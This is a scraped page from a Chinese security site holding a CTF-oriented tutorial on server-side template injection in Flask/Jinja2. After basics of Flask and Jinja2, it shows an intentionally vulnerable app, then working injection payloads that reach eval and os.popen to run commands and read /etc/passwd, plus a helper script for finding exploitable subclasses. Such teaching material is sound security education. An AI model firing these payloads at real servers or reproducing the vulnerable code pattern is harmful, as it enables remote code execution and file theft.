noreferrer">友情链接</a></li></ul></div><div class="col4"><div class="title">内容需知</div><ul><li><a href="https://www.anquanke.com/contribute/tips" target="_blank" rel="noopener noreferrer">投稿须知</a></li><li><a href="https://www.anquanke.com/note/repost" target="_blank" rel="noopener noreferrer">转载须知</a></li><li>官网QQ群8：819797106</li><li>官网QQ群3：830462644(已满)</li><li>官网QQ群2：814450983(已满)</li><li>官网QQ群1：702511263(已满)</li></ul></div><div class="col5"><div class="title">合作单位</div><ul><li><a href="http://www.cert.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t01592a959354157bc0.png" style="max-height: 40px;"></a></li><li style="margin-top: -20px;"><a href="http://www.cnnvd.org.cn/" target="_blank" rel="noopener noreferrer"><img alt="安全客" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t014f76fcea94035e47.png" style="max-height: 50px; margin-top: 10px;"></a></li></ul></div></div><div class="right g-w"><span>Copyright © 北京奇虎科技有限公司 360网络攻防实验室 安全客 All Rights Reserved </span><a href="https://beian.miit.gov.cn/">京ICP备08010314号-66</a><span id="cnzz_stat_icon_1271278035"><a href="https://www.cnzz.com/stat/website.php?web_id=1271278035" target="_blank" title="站长统计"><img border="0" hspace="0" vspace="0" src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/pic.gif" fcqsowstp=""></a></span></div><div class="layer" style="display: none;"><div class="layer-main"><div class="layer-title">微信二维码</div><b class="layer-close">X</b><img src="./初探 Python Flask+Jinja2 SSTI-安全客 - 安全资讯平台_files/t0151209205b47f2270.jpg" alt="安全客"></div></div></div></div><script>window.__state__={"artical":{"post":{"id":226900,"title":"初探 Python Flask+Jinja2 SSTI","category_name":"安全知识","category_slug":"knowledge","desc":"SSTI主要是因为某些语言的框架中使用了渲染函数，比如Python中的Flask框架用jinjia2模块内的渲染函数，在不规范的代码中，导致用户可以控制变量并构造恶意的表达式，比如{{98-2}}，恶意的表达式未经严格的过滤直接带入模板中渲染执行使得攻击者可以读取文件，远程代码执行等等。","date":"2021-01-12 16:30:55","time_interval":"2021-01-12","status":"publish","comment":2,"cover":"https://p3.ssl.qhimg.com/t0105c011a6c7e9e987.jpg","subject":false,"red":false,"type":"origin","url":"","source":"","fee":"350","origin_author":"","pv":256739,"like_count":4,"liked":0,"tags":["SSTI"],"is_favorite":false,"favorite_count":10,"content":"<html>\n<head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"></head>\n<body>\n<p id=\"h1--python-flask-jinja2-ssti\"><img class=\"alignnone size-full wp-image-228049 aligncenter\" alt=\"\" width=\"720\" height=\"373\" data-original=\"https://p3.ssl.qhimg.com/t0105c011a6c7e9e987.jpg\"></p>\n<p> </p>\n<h2 name=\"h2-0\" id=\"h2-0\">SSTI简介</h2>\n<p>SSTI主要是因为某些语言的框架中使用了渲染函数，比如Python中的Flask框架用jinjia2模块内的渲染函数，在不规范的代码中，导致用户可以控制变量并构造恶意的表达式，比如<code>{{98-2}}</code>，恶意的表达式未经严格的过滤直接带入模板中渲染执行使得攻击者可以读取文件，远程代码执行等等。现在最多的还是在CTF中遇到该漏洞，最多的也是Python+flask+jinja2，通过绕过过滤规则成功命令执行+读取文件拿到flag，本文也会从0开始一点点剖析该漏洞的成因与利用。</p>\n<h2 name=\"h2-1\" id=\"h2-1\">Flask</h2>\n<h3 name=\"h3-2\" id=\"h3-2\">\n<a class=\"reference-link\" name=\"Flask%E7%AE%80%E4%BB%8B\"></a>Flask简介</h3>\n<p><strong>Flask</strong>是一个用Python编写的<strong>Web应用程序框架</strong>优点是提供给用户的扩展能力很强，框架只完成了简单的功能，有很大一部分功能可以让用户自己选择并实现。</p>\n<p><strong>WSGI</strong></p>\n<p><strong>Web Server Gateway Interface（Web服务器网关接口，WSGI）</strong>已被用作Python Web应用程序开发的标准。 WSGI是Web服务器和Web应用程序之间通用接口的规范。而Flask类的实例就是WSGI应用程序。</p>\n<p><strong>Werkzeug</strong></p>\n<p>它是一个WSGI工具包，它实现了请求，响应对象和实用函数。 这使得能够在其上构建web框架。 Flask框架使用Werkzeug作为其基础之一。也就是Flask的URL规则也是基于此。</p>\n<h3 name=\"h3-3\" id=\"h3-3\">\n<a class=\"reference-link\" name=\"Flask%E5%AE%89%E8%A3%85\"></a>Flask安装</h3>\n<pre><code>pip3 install flask  # 获取最新版本flask\r\n</code></pre>\n<h3 name=\"h3-4\" id=\"h3-4\">\n<a class=\"reference-link\" name=\"%E5%88%9B%E5%BB%BAFlask%E9%A1%B9%E7%9B%AE\"></a>创建Flask项目</h3>\n<p>可以根据下图创建一个基于python3的flask项目</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p4.ssl.qhimg.com/t0141d3c386bb45297f.png\"></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p4.ssl.qhimg.com/t01063d591cfd0cf26c.png\"></p>\n<h3 name=\"h3-5\" id=\"h3-5\">\n<a class=\"reference-link\" name=\"Flask%20e.g.\"></a>Flask e.g.</h3>\n<p>样例代码：</p>\n<p><code>app = Flask(__name__)</code> ：Flask类必须指定一个参数，即主模块或包的名字。这里<code>__name__</code>为系统变量，指的是当前py文件的文件名。</p>\n<p><code><a class=\"at-link\" title=\"@app\" href=\"https://github.com/app\">@app</a>.route()</code>： 路由与视图函数。从client发送的url通过web服务器传给flask实例对象时，因为该实例需要知道对于每个url要对应执行哪部分的函数所以保存了一个url和函数之间的映射关系，处理url和函数之间关系的程序称为路由，在flask中用的是app.route路由装饰器，把装饰的函数注册为路由。简单理解就是<code><a class=\"at-link\" title=\"@app\" href=\"https://github.com/app\">@app</a>.route(url)</code>装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。<br><code>app.run()</code>：样例为 <code>run_simple(host, port, self, **options)</code> 当不设置时，默认监听127.0.0.1:5000, 监听0.0.0.0的话则任意IP都可访问。该函数作用为开启flask集成的web服务，服务开启后会一直监听5000端口并处理请求知道程序停止。</p>\n<pre><code>from flask import Flask\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route('/')\r\ndef index():\r\n    return 'hello Zh1z3ven'\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run()\r\n</code></pre>\n<p>运行一下当前的py文件，控制台出现如下图所示的日志，flask默认监听在5000端口，访问一下看看。</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p4.ssl.qhimg.com/t01d73f80d984b3b3b9.png\"></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p1.ssl.qhimg.com/t0110bd048ba50c3ad7.png\"></p>\n<h3 name=\"h3-6\" id=\"h3-6\">\n<a class=\"reference-link\" name=\"Flask%E4%B8%AD%E7%9A%84%E8%B7%AF%E7%94%B1\"></a>Flask中的路由</h3>\n<p>上面我们也提到了，简单理解就是<code><a class=\"at-link\" title=\"@app\" href=\"https://github.com/app\">@app</a>.route(url)</code>装饰器告诉Flask什么url触发什么函数，而通过装饰器将函数与url绑定在一起就称为路由。</p>\n<p>这里看一下路由的几个基本操作</p>\n<p><strong>0x01 指定访问路径为/</strong></p>\n<pre><code>@app.route('/')\r\ndef index():\r\n    return 'hello Zh1z3ven'\r\n</code></pre>\n<p><strong>0x02 传递参数</strong></p>\n<p>这里可以实现url的动态获取并在页面输出username</p>\n<pre><code>@app.route('/user/&lt;username&gt;')\r\ndef hi_user(username):\r\n    return 'hi %s' % username\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t010ad197208933fbe0.png\"><br><strong>0x03 限定请求方式</strong></p>\n<p>在<code><a class=\"at-link\" title=\"@app\" href=\"https://github.com/app\">@app</a>.route</code>中，可以通过如下设置：<code><a class=\"at-link\" title=\"@app\" href=\"https://github.com/app\">@app</a>.route('/user/&lt;int:user_id&gt;', methods=['GET', 'POST'])</code> 设置参数<code>user_id</code>的数据类型，以及http请求方式。</p>\n<pre><code>@app.route('/user/&lt;int:user_id&gt;', methods=['GET', 'POST'])\r\ndef hi_userid(user_id):\r\n    return 'hello %d' % user_id\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p5.ssl.qhimg.com/t0153c10dabcb08875f.png\"></p>\n<h3 name=\"h3-7\" id=\"h3-7\">\n<a class=\"reference-link\" name=\"main%E5%85%A5%E5%8F%A3\"></a>main入口</h3>\n<p>在Flask官方文档也提到最好用 <code>if __name__ == '__main__'</code> 来作为程序入口 python中的main入口也就是 <code>if __name__ == '__main__'</code></p>\n<p>当运行py文件时因为 当前<strong>文件名</strong>(<code>__name__</code>)与<strong>顶层代码作用域</strong>(<code>__main__</code>)是相等的，所以会执行后面的代码块，而当该文件作为一个模块被import到别的文件时，此时并不会执行该文件，而是类似于php中include函数那样将该文件包含到其他文件中去。</p>\n<p>到此Flask的工作流程 大致就已经清晰了，首先是当程序运行时，app.run()被调用执行并监听相应的host和port（默认为127.0.0.1:5000），当客户端有http请求通过浏览器发送至服务器端时时，服务端会根据request中的url对照路由找到相应需要执行的函数，并将函数返回值生成response反馈给客户端。</p>\n<p> </p>\n<h2 name=\"h2-8\" id=\"h2-8\">Jinja2渲染模板</h2>\n<h3 name=\"h3-9\" id=\"h3-9\">\n<a class=\"reference-link\" name=\"%E7%AE%80%E4%BB%8B\"></a>简介</h3>\n<p>jinja2是Python的一个流行的模板引擎。Web模板系统将模板与特定数据源组合以呈现动态网页。</p>\n<h3 name=\"h3-10\" id=\"h3-10\">\n<a class=\"reference-link\" name=\"%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95\"></a>基本语法</h3>\n<p>0x01 <code>{%%}</code></p>\n<p>主要用来声明变量或用在条件语句或循环语句</p>\n<p>注意条件和循环需要多一层 {%endif%} 或 {%endfor%}用作结尾</p>\n<pre><code>{% set c = 'Zh1z3ven' %}\r\n{% if 1==1 %}Zh1z3ven{%endif%}\r\n{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}\r\n</code></pre>\n<p>0x02 <code>{{}}</code></p>\n<p>将大括号内的表达式执行并输出结果到模板内</p>\n<pre><code>{{98-2}} # 96\r\n</code></pre>\n<p>0x03 <code>{##}</code></p>\n<p>注释</p>\n<h3 name=\"h3-11\" id=\"h3-11\">\n<a class=\"reference-link\" name=\"%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84Demo\"></a>存在漏洞的Demo</h3>\n<p>在jinja2中存在一个模板类<code>Tempalte</code>，<code>Template</code>类中的<code>render()</code>方法可以实现渲染的作用。而在jinja2中存在三种语法，针对CTF的话遇到的就是<code>{{}}</code>和<code>{%%}</code>，<code>{{}}</code>代表变量取值，是一种特殊的占位符，当我们传入的是一个表达式或方法，则会执行并返回他们的结果传入客户端，比如看下面这段代码我们执行后构造一个表达式去访问查看页面结果：</p>\n<pre><code>from flask import Flask, request\r\nfrom jinja2 import Template\r\n\r\napp = Flask(__name__)\r\n\r\n@app.route('/')\r\ndef test1():\r\n    name = request.args.get('name')\r\n\r\n    t = Template('''\r\n&lt;html&gt;\r\n  &lt;head&gt;\r\n    &lt;title&gt;Zh1z3ven&lt;/title&gt;\r\n  &lt;/head&gt;\r\n &lt;body&gt;\r\n      &lt;h1&gt;Hello, %s !&lt;/h1&gt;\r\n  &lt;/body&gt;\r\n&lt;/html&gt;\r\n\r\n    '''% (name))\r\n\r\n    return t.render()\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run()\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p2.ssl.qhimg.com/t01219e5e43b860e627.png\"></p>\n<p>这里可以看到是存在SSTI注入的，因为在<code>{{98-2}}</code>中的表达式被执行了，也就是漏洞成因：当在不规范的代码中，直接将用户可控参数<code>name</code>在模板中直接渲染并将结果带回页面回显。所以在name参数输入<code>{{98-2}}</code>会输出<code>{{96}}</code></p>\n<h3 name=\"h3-12\" id=\"h3-12\">\n<a class=\"reference-link\" name=\"%E4%B8%8D%E5%AD%98%E5%9C%A8%E6%BC%8F%E6%B4%9E%E7%9A%84Demo\"></a>不存在漏洞的Demo</h3>\n<p>而在flask中常用的渲染方法为<code>render_template()</code> 、 <code>render_template_string()</code></p>\n<p>当使用 <code>render_template()</code> 时，扩展名为 <code>.html</code> 、 <code>.htm</code> 、 <code>.xml</code> 和 <code>.xhtml</code> 的模板中开启自动转义。</p>\n<p>当使用 <code>render_template_string()</code> 时，字符串开启 自动转义。</p>\n<p>简单示例如下：</p>\n<pre><code>&lt;!DOCTYPE html&gt;\r\n&lt;html lang=\"en\"&gt;\r\n&lt;head&gt;\r\n    &lt;meta charset=\"UTF-8\"&gt;\r\n    &lt;title&gt;{{title}} - Zh1z3ven&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n    &lt;h1&gt;Hello, {{user.name}}&lt;/h1&gt;\r\n    &lt;h2&gt;This is {{user.name}} information:{{user.info}}&lt;/h2&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n</code></pre>\n<p>其中<code>{{title}}</code>、<code>{{user.name}}</code>、<code>{{user.info}}</code>即为需要渲染的对象，我们在app.py里对其进行渲染。</p>\n<pre><code>from flask import Flask\r\nfrom flask import render_template\r\n\r\napp = Flask(__name__)\r\n\r\n\r\n@app.route('/')\r\n@app.route('/index')\r\ndef index():\r\n    user = {\r\n        'name' : 'Zh1z3ven',\r\n        'info' : 'I am Zh1z3ven'\r\n    }\r\n    return render_template(\"index.html\", title='Home', user=user)\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run()\r\n</code></pre>\n<p>运行app.py 下面我们看一下页面结果：</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p2.ssl.qhimg.com/t01993b9ebc6620fc76.png\"></p>\n<p>上面就是一个简单且正常通过渲染的页面，因为需要渲染的参数我们都在app.py中写死了，并未交给用户控制，所以不存在SSTI注入。但是CTF或开发人员写好的代码将渲染的参数交给用户可控，并且没有对参数进行过滤那么可能会导致SSTI注入漏洞的产生。</p>\n<p>通过两个例子也可以大致感受到漏洞的成因了</p>\n<p>1、存在用户可控参数。</p>\n<p>2、参数可被带入渲染函数内直接执行，即{{}}可被带入代码中让jinja2模块识别并解析。</p>\n<p> </p>\n<h2 name=\"h2-13\" id=\"h2-13\">SSTI思路</h2>\n<p>在CTF中，python的ssti大多是依靠某些继承链：基类—&gt;子类—&gt;危险方法来实现命令执行+文件读取，这里有点类似于java的反序列化漏洞寻找调用链的意思。其实主要还是依据python中的内置类属性和方法通过寻找可以读文件或执行命令的模块与函数达到我们的目的。</p>\n<h3 name=\"h3-14\" id=\"h3-14\">\n<a class=\"reference-link\" name=\"%E5%86%85%E7%BD%AE%E7%B1%BB%E5%B1%9E%E6%80%A7%E5%92%8C%E6%96%B9%E6%B3%95\"></a>内置类属性和方法</h3>\n<p>Python中的类和对象有许多内置属性以及相关函数，下面记录一些经常会用到的，可能会不全，遇到了再补充。</p>\n<p><strong>0x01 <code>__class__</code></strong></p>\n<p>python中一切皆对象，该方法返回当前对象所属的类，比如字符串对象则返回<code>&lt;class 'str'&gt;</code></p>\n<pre><code>&gt;&gt;&gt; \"\".__class__\r\n&lt;class 'str'&gt;\r\n</code></pre>\n<p><strong>0x02 <code>__bases__</code></strong></p>\n<p>以元组的形式返回一个类所直接集成的类。大多是用来获取到基类(object)，比如：</p>\n<pre><code>&gt;&gt;&gt; \"\".__class__.__bases__\r\n(&lt;class 'object'&gt;,)\r\n</code></pre>\n<p><strong>0x03 <code>__base__</code></strong></p>\n<p>以字符串形式返回一个类所直接集成的类</p>\n<p><strong>0x04 <code>__mro__</code></strong></p>\n<p>返回解析方法调用的顺序。</p>\n<pre><code>&gt;&gt;&gt; \"\".__class__.__mro__\r\n(&lt;class 'str'&gt;, &lt;class 'object'&gt;)\r\n</code></pre>\n<p><strong>0x05 <code>__subclasses__()</code></strong></p>\n<p>获取类的所有子类，经常配合<code>__bases__</code> <code>__mro__</code>来找到我们想要的读取文件或执行命令的类</p>\n<p>比如：<code>\"\".__class__.__bases__[0].__subclasses__()</code></p>\n<p>或者：<code>\"\".__class__.__mro__[1].__subclasses__()</code></p>\n<p><strong>0x06 <code>__init__</code></strong></p>\n<p>所有的可被当作模块导入的都包含 <code>__init__</code>方法，通过此方法来调用 <code>__globals__</code>方法</p>\n<p><strong>0x07 <code>__globals__</code></strong></p>\n<p>所有函数都会有一个 <code>__globals__</code> 属性， 用于获取当前空间下可使用的模块、方法及其所有变量，结果是一个字典。</p>\n<pre><code>&gt;&gt;&gt; import os\r\n&gt;&gt;&gt; var = 2333\r\n&gt;&gt;&gt; def fun():\r\n    pass\r\n\r\n&gt;&gt;&gt; class test:\r\n    def __init__(self):\r\n        pass\r\n\r\n\r\n&gt;&gt;&gt; print(test.__init__.__globals__)\r\n{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': None, '__annotations__': {}, '__builtins__': &lt;module 'builtins' (built-in)&gt;, 'os': &lt;module 'os' from 'C:\\\\Python3.7\\\\lib\\\\os.py'&gt;, 'var': 2333, 'fun': &lt;function fun at 0x00000238058C11F8&gt;, 'test': &lt;class '__main__.test'&gt;}\r\n</code></pre>\n<p><strong>0x08 <code>__builtins__</code></strong></p>\n<p><strong>在pyton2中为 <code>__builtins__</code> 和 <code>__builtin__</code></strong></p>\n<p>这里 <code>__builtins__</code> 是内建名称空间，是这个模块本身定义的一个名称空间，在这个内建名称空间中存在一些我们经常用到的内置函数（即不需要导入包即可调用的函数）如：print()、str()还包括一些异常和其他属性。</p>\n<p>而 <code>__builtins__</code> 实际上是一个指向或者说引用 <code>__builtin__</code> 的（有点类似于软链接），而真正BIF在被定义时是在 <code>__builtin__</code> 模块中进行的。</p>\n<p><strong>在python3中为 <code>__builtins__</code> 和 <code>builtins</code></strong></p>\n<p>这里只不过 <code>builtins</code> 代替的 <code>__builtin__</code></p>\n<p>在python中有一些BIF（内置函数）是可以直接调用的，比如str(), print()等，这些函数可以通过 <code>dir(__builtins__)</code> 可以查到。</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t0132c98ea48d068b61.png\"></p>\n<p><strong>0x09 内省request对象</strong></p>\n<p>即为Flask模板的一个全局变量request对象（flask.request），代表当前请求对象。</p>\n<p>当然可利用的远不止这些，上面只是做一点简单的总结，后续遇到有趣的姿势继续补充（填坑）。</p>\n<h3 name=\"h3-15\" id=\"h3-15\">\n<a class=\"reference-link\" name=\"%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF\"></a>利用思路</h3>\n<p>1、随便找一个内置类对象利用 <code>__class__</code>拿到该对象所对应的类</p>\n<pre><code>''.__class__.__bases__[0].__subclasses__()\r\n().__class__.__mro__[2].__subclasses__()\r\n().__class__.__mro__[-1].__subclasses__()\r\nrequest.__class__.__mro__[1]\r\n</code></pre>\n<p>2、用 <code>__bases__</code> 或 <code>__mro__</code> 拿到基类 <code>&lt;class 'object'&gt;</code></p>\n<p>3、用 <code>__subclasses__()</code> 获取所有子类</p>\n<p>4、在子类中寻找可以合适的继承链执行命令或读取文件</p>\n<p> </p>\n<h2 name=\"h2-16\" id=\"h2-16\">STTI利用</h2>\n<h3 name=\"h3-17\" id=\"h3-17\">\n<a class=\"reference-link\" name=\"%E6%B5%8B%E8%AF%95%E4%BB%A3%E7%A0%81\"></a>测试代码</h3>\n<pre><code>from flask import Flask, request\r\nfrom jinja2 import Template\r\n\r\n\r\napp = Flask(__name__)\r\n\r\n\r\n@app.route('/')\r\ndef test1():\r\n    name = request.args.get('name')\r\n\r\n    t = Template('''\r\n&lt;html&gt;\r\n&lt;head&gt;\r\n&lt;title&gt;Zh1z3ven&lt;/title&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n    &lt;h1&gt;Hello, %s !&lt;/h1&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n\r\n    '''% (name))\r\n\r\n    return t.render()\r\n\r\n\r\nif __name__ == '__main__':\r\n    app.run(host='127.0.0.1', debug=True)\r\n</code></pre>\n<h3 name=\"h3-18\" id=\"h3-18\">0x01 <code>__bultins__</code>\n</h3>\n<p><strong>python2&amp;python3均适用</strong></p>\n<p>比如我们打开一个python3的shell，键入 <code>\"\".__class__</code></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p2.ssl.qhimg.com/t019c4215760e5802ad.png\"></p>\n<p>可以看到结果为 <code>&lt;class 'str'&gt;</code></p>\n<p>再接着下一步，我们要获取到基类 <code>object</code> 键入：<code>\"\".__class__.__bases__</code></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t019d281a2a3e8ebf47.png\"></p>\n<p>可以看到结果是一个元组，而元组的第一个元素是基类 <code>object</code> ，所以要获取基类需要 <code>.__bases__[0]</code> ; 我们下面看看基类下的所有子类 ，键入： <code>\"\".__class__.__bases__[0].__subclasses__()</code></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p4.ssl.qhimg.com/t01694629c956b130fe.png\"></p>\n<p>这里可以看到有相当多的子类，且不同的Python版本在这里获取到的所有子类的顺序也不同，但是这样还是不太直观毕竟有几百个子类，我们用个小脚本进行筛选看看各个子类所处空间下可调用的模块、方法和变量都有什么也就是 <code>function.__globals__</code> 的结果。下面贴个寻找类对应顺序的脚本：</p>\n<p>用法大概是这样的，因为大概思路前面前三步基本差不多，主要是后面 <code>__init__.__globals__</code> 后面的姿势会很多，也是一个难理解的点。这个脚本就是找从<code>__init__.__globals__</code> 后面想要根据那个思路入手取执行命令或读取文件，比如下面我想用 <code>__builtins__</code> 去构造执行命令的继承链: 先查询都哪些子类调用了<code>__builtins__</code></p>\n<p>find.py</p>\n<pre><code>search = '__builtins__'   \r\nnum = -1\r\nfor i in ().__class__.__bases__[0].__subclasses__():\r\n    num += 1\r\n    try:\r\n        if search in i.__init__.__globals__.keys():\r\n            print(i, num)\r\n    except:\r\n        pass\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p1.ssl.qhimg.com/t0197beb8b312352a1c.png\"></p>\n<p>这里拿经典的 <code>&lt;class 'os._wrap_close'&gt; 128</code> 举例，构造payload如下：</p>\n<p><code>http://127.0.0.1:5000/?name={{\"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval']('__import__(\"os\").popen(\"whoami\").read()')}}</code></p>\n<p>ps：eval()函数用来执行一个字符串表达式，并返回表达式的值，这里相当于调用了os模块利用popen函数执行whoami</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p1.ssl.qhimg.com/t0119b7dc663a3fcc74.png\"></p>\n<p>当然利用<code>__builtins__</code>还有很多其他姿势，需要注意的就是python2与python3中有些函数不一样需要进行替换</p>\n<p><strong>Python3 payload</strong></p>\n<pre><code># 0x01 利用eval()将其中字符串作为代码执行  \r\n{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval'](\"__import__('os').system('whoami')\")}}\r\n\r\n\r\n{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('whoami').read()\")}}\r\n\r\n# 0x02 直接调用__import__()构造payload执行命令\r\n{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['__import__']('os').popen('whoami').read()}}\r\n\r\n# 0x03 调用open()读取文件\r\n{{().__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['__builtins__']['open']('C:\\\\Windows\\win.ini').read()}}\r\n</code></pre>\n<p><strong>python2 payload</strong></p>\n<p>（1）linecache执行命令</p>\n<p>同样是先找到子类中有可直接调用linecache的，</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t0106b54c1aca35f9f9.png\"></p>\n<pre><code>(&lt;class 'warnings.WarningMessage'&gt;, 59)\r\n(&lt;class 'warnings.catch_warnings'&gt;, 60)\r\n</code></pre>\n<p>payload</p>\n<pre><code>{{[].__class__.__base__.__subclasses__()[59].__init__.func_globals['linecache'].os.popen('whoami').read()}}\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p5.ssl.qhimg.com/t01b61e591f8f4ad91b.png\"></p>\n<p>（2） file类读取文件</p>\n<p>file类是只存在python2的，python3没有，但是类似于open</p>\n<p>payload</p>\n<pre><code>{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()}}\r\n\r\n{{().__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').readlines()}}\r\n</code></pre>\n<h3 name=\"h3-19\" id=\"h3-19\">&lt;a name=”0x02 <code>['popen'](\"command\").read()</code>” class=”reference-link”&gt;0x02 <code>['popen'](\"command\").read()</code>\n</h3>\n<p>这里思路是直接找某个子类可以直接调用popen这个方法，这里在本地找到的是 <code>os._wrap_close</code> 这个类。</p>\n<p>payload</p>\n<pre><code>http://127.0.0.1:5000/?name={{\"\".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen'](\"whoami\").read()}}`\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t01c1d2c4e0ea168673.png\"></p>\n<h3 name=\"h3-20\" id=\"h3-20\">0x03 直接调用 <code>__import__()</code>\n</h3>\n<p>这里思路是找子类中可以直接调用 <code>__import__()</code> 然后引用 os 模块去执行命令</p>\n<p>先通过find.py找到可以直接调用 <code>__import__()</code>的子类</p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p4.ssl.qhimg.com/t01c61d9bc43ba144e0.png\"></p>\n<p>之后通过 <code>__import__()</code> 调用os模块去执行命令，payload如下：</p>\n<pre><code>{{\"\".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p3.ssl.qhimg.com/t01e607b9f1a6d95d79.png\"></p>\n<h3 name=\"h3-21\" id=\"h3-21\">\n<a class=\"reference-link\" name=\"0x04%20%E5%88%A9%E7%94%A8%E5%BE%AA%E7%8E%AF%E6%9E%84%E9%80%A0payload\"></a>0x04 利用循环构造payload</h3>\n<p>上面提到过 <code>{% for i in [1, 2, 3] %}Zh1z3ven{%endfor%}</code> 可用作循环。我们改造下0x01 中利用 <code>os._wrap_close</code> 类的 <code>['__builtins__']['eval']</code> 注入</p>\n<p><strong>执行命令的payload</strong>如下,这里有一个小坑点，比如我们第一次if判断 <code>if i.__name__ == '_wrap_close'</code>时，==右面不能写 <code>os._wrap_close</code> 而要写<code>_wrap_close</code> ,因为 <code>__name__</code> 返回值是 <code>_wrap_close</code></p>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t01a0903a24d055be08.png\"></p>\n<pre><code>{% for i in \"\".__class__.__base__.__subclasses__() %}\r\n{% if i.__name__ == '_wrap_close' %}\r\n  {% for x in i.__init__.__globals__.values() %}   \r\n  {% if x.__class__ == {}.__class__ %}  # 筛选出dict类型元素\r\n    {% if 'eval' in x.keys() %}  \r\n        {{ x['eval']('__import__(\"os\").popen(\"whoami\").read()')}}\r\n    {% endif %}\r\n  {% endif %}\r\n  {% endfor %}\r\n{% endif %}\r\n{% endfor %}\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p2.ssl.qhimg.com/t015ab8c86115a47699.png\"></p>\n<p><strong>读取文件payload</strong>,注意Windows环境需要 <code>\\\\</code> 标识路径</p>\n<pre><code>{% for i in \"\".__class__.__base__.__subclasses__() %}{% if i.__name__ == '_wrap_close' %}{{i.__init__.__globals__['__builtins__'].open('C:\\\\Users\\\\LENOVO\\\\Desktop\\\\1.txt', 'r').readlines()}}{% endif %}{% endfor %}\r\n</code></pre>\n<p><img class=\"aligncenter\" alt=\"\" data-original=\"https://p0.ssl.qhimg.com/t018016eaf6442d85fd.png\"></p>\n<p> </p>\n<h2 name=\"h2-22\" id=\"h2-22\">小结</h2>\n<p>当然关于SSTI利用远不止这些，且还有常见的过滤以及被ban函数的相关绕过姿势这里也没有写上，准备下一篇记录关于CTF基于常见的过滤的绕过姿势。这篇主要还是放在理解Flask+jinja2语法和SSTI这个洞入门。</p>\n<p> </p>\n<h2 name=\"h2-23\" id=\"h2-23\">参考文章</h2>\n<p><a href=\"https://xz.aliyun.com/t/3679\">https://xz.aliyun.com/t/3679</a><br><a href=\"https://xz.aliyun.com/t/7746\">https://xz.aliyun.com/t/7746</a><br><a href=\"https://xz.aliyun.com/t/6885\">https://xz.aliyun.com/t/6885</a><br><a href=\"https://www.cnblogs.com/chaojiyingxiong/p/9549987.html\">https://www.cnblogs.com/chaojiyingxiong/p/9549987.html</a><br><a href=\"https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n\">https://www.yuque.com/jxswcy/ctfnotebook/tdxk3n</a><br><a href=\"https://www.anquanke.com/post/id/85571\">https://www.anquanke.com/post/id/85571</a><br><a href=\"https://hetian.blog.csdn.net/article/details/111399386\">https://hetian.blog.csdn.net/article/details/111399386</a><br><a href=\"https://xz.aliyun.com/t/2308#toc-10\">https://xz.aliyun.com/t/2308#toc-10</a></p>\n</body>\n</html>","index":[{"title":"SSTI简介","id":"#h2-0","sub":[]},{"title":"Flask","id":"#h2-1","sub":[{"title":"Flask简介","id":"#h3-2"},{"title":"Flask安装","id":"#h3-3"},{"title":"创建Flask项目","id":"#h3-4"},{"title":"Flask 